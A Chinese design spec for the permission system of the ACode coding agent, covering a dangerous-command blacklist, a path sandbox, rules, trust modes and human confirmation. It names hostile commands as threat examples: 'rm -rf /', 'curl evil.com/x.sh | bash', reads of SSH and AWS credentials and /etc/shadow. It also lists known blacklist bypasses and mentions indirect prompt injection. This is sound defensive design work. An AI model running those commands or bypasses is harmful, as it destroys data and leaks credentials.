# ACode 阶段五：权限系统 — spec

> 最后更新：2026-08-19
> 对应参考书第 6 章「安全层的权限系统」（理论篇 chapter-6-1 + 实战篇 chapter-6-2 + Python/Go/Java 三版源码解析）

## 背景

ACode 的 Agent Loop 已经能自主读代码、写代码、跑命令、修 bug，循环往复直到任务完成。但能力越大风险越大：Bash 工具能执行**任何** shell 命令，文件工具能读写**任何**路径。当前的安全措施只有一块：非只读工具执行前弹一个布尔确认框（阶段四留下的「权限拦截位」），`Permission` 枚举只标记不拦截。

没有系统级防护时，后果是具体的：

- 一个 `rm -rf /`、`curl evil.com/x.sh | bash` 就能毁掉整个系统，确认框拦不住（用户可能误点允许，且默认模式才弹窗）。
- `ReadFile` 可以读 `~/.ssh/id_rsa`、`~/.aws/credentials`、`/etc/shadow`——即使模型本意不坏，也可能被项目文件里的「间接 prompt 注入」诱导去读。
- 用户授权修 bug，Agent「太积极」顺手 `git push --force` 重构半个项目——越权操作。
- 每类操作都弹确认框又会把人烦到关掉确认或放弃使用。

权限系统要解决的问题：**在不过度限制 Agent 能力的前提下，把已知高风险操作拦在界内**。诚实的预期是：任何单层防线都可能被绕过——危险命令黑名单是启发式、不承诺穷举所有混淆与参数变体——安全来自五层防线叠加 + HITL 兜底，而非任一单层的绝对保证。本章建立一套纵深防御（Defense in Depth）的五层防线：危险命令黑名单 → 路径沙箱 → 权限规则 → 权限模式 → HITL 人在回路，每道拦住不同类型的威胁，任何一层出问题，下一层还兜得住。

## 目标用户

- 本人：让 ACode 在多步任务中既高效又安全——读代码不打断、写文件/跑命令受控、已知高风险模式被硬拦截（黑名单启发式、不承诺穷举，见能力 1 与 Out of Scope）
- 后续阶段潜在使用者：终端开发者、习惯命令行工作流的用户

## 能力清单

1. 危险命令黑名单：Bash 执行前用预编译正则拦截**已知高风险模式**（递归删根、格式化磁盘、写裸设备、fork bomb、管道执行远程脚本等），任何模式、任何规则、任何用户确认都覆盖不了；但黑名单是启发式最佳努力，混淆/参数变体绕过不承诺拦截（见 Out of Scope）
2. 安全命令白名单：只读安全命令（`ls`/`cat`/`git status`/版本查询等）自动放行，不弹确认、不打断
3. 路径沙箱：ReadFile/WriteFile/EditFile 的目标路径**先解析符号链接再做前缀校验**，必须落在项目根目录或系统临时目录内；新建文件（尚不存在）走父目录解析兜底
4. 权限规则引擎：`工具名(模式)` 语法 + 扁平 glob 匹配（`*` 可跨 `/`、精确匹配优先），allow/deny 三份配置（用户级/项目级/本地级），deny 跨层合并不可翻转，同层后定义优先
5. 权限模式：default / acceptEdits / plan / bypassPermissions 四档整体信任策略，plan 模式含「计划文件写入放行」例外
6. 五层防线串成的决策链：内容提取 → 危险命令 → 安全命令 → 沙箱 → plan 例外（canonical 判断、在沙箱之后）→ 规则 → 会话级「始终允许」→ 模式矩阵 → HITL，任一判定 ALLOW/DENY 即返回，只有 ASK 才打扰用户
7. HITL 三选一：需要确认时弹「放行 / 始终允许 / 拒绝」；「始终允许」写入会话级记忆并持久化到本地规则文件，同类操作之后自动放行
8. 拒绝不终止循环：权限被拒（黑名单/沙箱/规则/用户拒绝）产生**带错误标记的工具结果**返回给模型，模型看到原因后可换策略继续，Loop 不中断
9. 模式可配置可切换：`.acode/config.yaml` 的 `permission_mode` 设默认档位，运行时 `/permission-mode` 命令即时切换

## 非功能要求

- **安全优先（fail closed）**：危险命令拦截与路径沙箱一旦命中即拒绝、不可被任何层覆盖；路径解析失败按拒绝处理（新建文件经父目录兜底，不误伤）
- **规则只收缩不放宽**：沙箱是文件工具的硬边界，权限规则只能在沙箱内收缩权限，无法放行沙箱外路径——`ReadFile(~/.m2/settings.xml) allow` 这类规则永不生效（沙箱先于规则判定）；文件工具想要额外放行只能靠扩展沙箱根（本阶段不做）
- **极致容错**：规则文件不存在 / 读取失败 / YAML 解析失败 / 单条格式不对，全部静默跳过，一条坏规则不搞崩权限系统
- **即时生效**：`/permission-mode` 切档立即生效；「始终允许」写盘后立即生效；规则文件改动需重启（与参考实现一致，不做热加载）
- **并发安全**：读类工具在虚拟线程并发执行，权限检查必须线程安全（检查是纯内存只读，不阻塞并发路径）
- **零破坏接入**：存量交互工具（AskUser / ExitPlanMode）标记为只读、任何模式放行、不弹确认；现有确认机制升级为三选一而非另起炉灶
- **拒绝原因契约**：权限层只返回纯原因（如「危险命令：…」「路径 … 超出沙箱范围」「规则拒绝」），由 Agent 层统一包装成「权限拒绝：<原因>」回填模型，任何路径都不会重复出现前缀
- **可测试**：五层各自独立可测（不依赖真实文件/命令/API），决策链离线断言
- **无网络依赖**：新增逻辑的单元测试不依赖真实 provider

## 设计骨架

### 分层结构

```
┌───────────────────────────────────────────────┐
│  UI 层：确认对话框（三选一）、/permission-mode │
├───────────────────────────────────────────────┤
│  Agent 层：循环编排 + 事件模型                  │
│  （拒绝→错误工具结果回填，Loop 继续）           │
├───────────────────────────────────────────────┤
│  权限层（本章新增核心）：五层防线                 │
│  危险命令检测 · 路径沙箱 · 规则引擎 · 模式矩阵    │
├───────────────────────────────────────────────┤
│  工具层：Tool 接口 / 注册中心                   │
│  （Permission 枚举从「仅标记」变为「决策输入」） │
├───────────────────────────────────────────────┤
│  Provider 层 + 消息模型层（本章不动）           │
└───────────────────────────────────────────────┘
```

- **权限层**是本章新增核心：一个决策检查器串联五层防线中的四类组件——危险命令检测（安全白名单 + 危险黑名单）、路径沙箱、规则引擎、模式矩阵，外加「会话级始终允许」记忆；第 5 道防线 HITL 确认在 UI 层。
- **Agent 层**只在工具执行前插入一次检查：ALLOW 直接执行、DENY 返回错误结果、ASK 走确认门槛。拒绝路径复用餐具已就位的「错误结果入历史、循环继续」机制。
- **工具层**不动接口，`Permission` 枚举（READ/WRITE/EXEC）直接作为模式矩阵的工具分类。

### 五层防线串成决策链（一次工具调用的完整路径）

```
工具调用 (ToolName, args)
  ↓ ① 内容提取：Bash→command，ReadFile/WriteFile/EditFile→file_path，
  │             Glob/Grep→pattern（无对应字段 → 跳过 ②~⑦）
  ↓ ② 危险命令黑名单（仅 Bash）：命中 → DENY（硬拦截）
  ↓ ③ 安全命令白名单（仅 Bash）：命中 → ALLOW（不打扰）
  ↓ ④ 路径沙箱（仅文件工具）：越界 → DENY（硬边界）
  ↓ ⑤ plan 例外（仅 permission_mode=plan）：file_path 经 canonical 解析后
  │        以 canonical 的 {项目}/.acode/plans 根 startsWith → ALLOW
  │        （在沙箱之后判断，防 .. 逃逸 / 符号链接逃逸绕过沙箱）
  ↓ ⑥ 权限规则（全部工具）：allow/deny 直接返回；无匹配继续
  ↓ ⑦ 会话级「始终允许」集合：命中 → ALLOW
  ↓ ⑧ 权限模式矩阵：ALLOW/DENY 返回；ASK → 触发 HITL
  ↓
  HITL 确认：放行 → 执行｜始终允许 → 记会话 + 写本地规则 + 执行｜拒绝 → 错误结果
```

任何一层给出明确判定（ALLOW/DENY）立即返回，不再往下走；只有全部拿不定主意（ASK）才弹确认框打扰用户。DENY 永远以「带原因的错误工具结果」回填模型，模型可调整策略继续下一轮。

### 权限模式矩阵

| 模式 | 只读工具 | 文件写工具 | Bash | 说明 |
|---|---|---|---|---|
| default | Allow | Ask | Ask | 日常开发：读代码/搜代码不打断，改文件/跑命令过目 |
| acceptEdits | Allow | Allow | Ask | 信任改代码，命令仍谨慎 |
| plan | Allow | Ask | Ask | 与 default 矩阵一致；只读限制主要靠「计划文件例外 + 模式矩阵」，写计划文件本身放行 |
| bypassPermissions | Allow | Allow | Allow | 全部放行，但黑名单 + 沙箱仍生效；仅限完全受控环境 |

### 关键设计决策（已确认）

| 决策点 | 结论 |
|---|---|
| 命名空间 | 规则文件沿用 ACode 现有 `.acode/` 约定：`~/.acode/permissions.yaml`（用户级）、`{项目}/.acode/permissions.yaml`（项目级）、`{项目}/.acode/permissions.local.yaml`（本地级） |
| 规则优先级 | 本地级 > 项目级 > 用户级（越靠近项目越高，与 ConfigLoader 一致；参考书理论篇 ASCII 图写反，按实战篇 + Python/Go/Java 源码 + Claude Code 惯例） |
| deny 跨层合并 | **不可翻转**：逐层求值——每层（local/project/user 各自文件）内部从后往前、后定义覆盖先定义，得该层最终结果；任一层最终为 DENY 即返回 DENY；否则按 local > project > user 取第一个 ALLOW；无匹配返回 null。这同时满足「同层后定义优先」（同层先 deny、后 allow → ALLOW）与「跨层 deny 不可翻转」（用户级 deny > 本地级 allow）。后加的 deny 同样覆盖先前「始终允许」落盘的本地 allow（显式授权被更高层新 deny 静默推翻，是「deny 永远赢」的既定语义，非缺陷）。偏离 Java 参考的「扁平列表后定义优先」实现，按理论篇 + Python 源码（Java 参考代码与它自己的文字声明矛盾） |
| 同层优先级 | 后定义优先（文件内从后往前匹配） |
| 规则匹配语义 | `工具名(模式)` 用扁平字符串 glob：先精确相等（防 glob 元字符误匹配「始终允许」持久化的精确内容），再 `*`→`.*`、`?`→`.` 全串正则匹配（Python fnmatch 语义，`*` 可跨 `/`）。偏离 Java 参考的 PathMatcher（其 `*` 不跨 `/`，`ReadFile(*.env*)` 匹配不了绝对路径） |
| 模式数量 | 4 档（default/acceptEdits/plan/bypassPermissions）。Python 参考的 custom/dontAsk 不做，实战篇只验证这 4 档 |
| 沙箱强度 | 解析符号链接 + 前缀校验（理论篇要求的 symlink 逃逸防护），比 Java 参考的 normalize-only 更严；`java.io.tmpdir` 作为系统临时目录（非字面 `/tmp`） |
| 规则加载 | 构造时加载一次、追加后重载（对齐 Java 参考）；手动改文件需重启生效 |
| 「始终允许」持久化 | 持久化为精确内容 `工具名(内容)`（确定性、可预测）；自动通配泛化（`git commit *`）不做，留作增强 |
| 模式设置 | config 键 `permission_mode`（启动默认）+ 运行时 `/permission-mode` 命令（即时切档） |
| plan 权限模式与 /plan | 两套独立开关：`permission_mode=plan` 只影响权限决策；`/plan` 是 Agent 规划循环（已有，Agent 层按只读工具过滤）。ACode 的 /plan 从工具列表层面就排除了写工具，权限层 plan 模式是其配置侧的对偶 |
| HITL 选项 | 三选一「放行/始终允许/拒绝」。「始终允许」= 会话级记忆（即时生效）+ 本地规则文件持久化（重启后仍在）。不做独立「本会话允许」选项。会话级「始终允许」先于模式矩阵判定，**用户显式授权 > plan 限制**（plan 模式下点「始终允许」可放行计划目录外的写）；持久化规则不感知模式、跨模式长期生效 |
| 交互工具 | AskUserTool / ExitPlanModeTool 标记只读，任何模式放行、不弹确认 |
| 确认机制 | 现有布尔确认升级为三选一返回（不放行即拒绝的两态不够：需要「始终允许」第三态） |

## Out of Scope（本章明确不做）

- 网络请求限制、资源用量配额、审计日志（参考书实战篇明确「后续章节」）
- 自定义危险命令黑名单模式（内置 8 条固定；extra patterns 扩展不做）
- 黑名单的编码/混淆/参数变体绕过检测（黑名单是启发式最佳努力：`rm -rf --no-preserve-root /`、`rm -rf /*`、`echo ... | base64 -d | sh` 等已知不拦截，依赖规则 / HITL 等其他层兜底）
- 规则文件热加载（手动改文件即时生效；对齐参考实现，重启生效）
- 沙箱覆盖 Glob/Grep 的可选 `path` 参数（对齐参考实现，仅覆盖三个路径工具）。**威胁边界**：Glob/Grep 传 `path` 指向项目外目录时，仍可搜索/暴露沙箱外文件名、内容或目录结构，default 下二者为 READ 自动放行——本阶段接受该风险（模型行为约束 + 后续阶段收紧）
- 权限检查与工具打开文件之间的 TOCTOU 竞态（检查后、使用前符号链接被替换）：单用户本地工具不假设并发恶意攻击者，本阶段不在实现层做原子化文件句柄检查（如 NOFOLLOW 强制），路径安全以「检查时解析符号链接 + 前缀校验」为准
- 出界文件授权 / 沙箱根扩展（读 `~/.m2/settings.xml`、`~/.gitconfig` 等家目录配置：沙箱仅放行项目根 + 系统临时目录，且规则不能放宽沙箱；需要时扩展 allowedRoots，本阶段不做）
- 独立「本会话允许」HITL 选项（会话级记忆作为「始终允许」的即时生效机制，不单列选项）
- prompt 注入的模型层识别（依赖系统层拦截，不指望模型自判）
- 权限使用统计、黑名单命中日志的持久化与展示
- MCP 工具接入（下一章）
- 团队共享规则（`.acode/` 全目录 gitignore，规则文件与 config.yaml 一样不进版本控制；单人工具，共享留待后续）
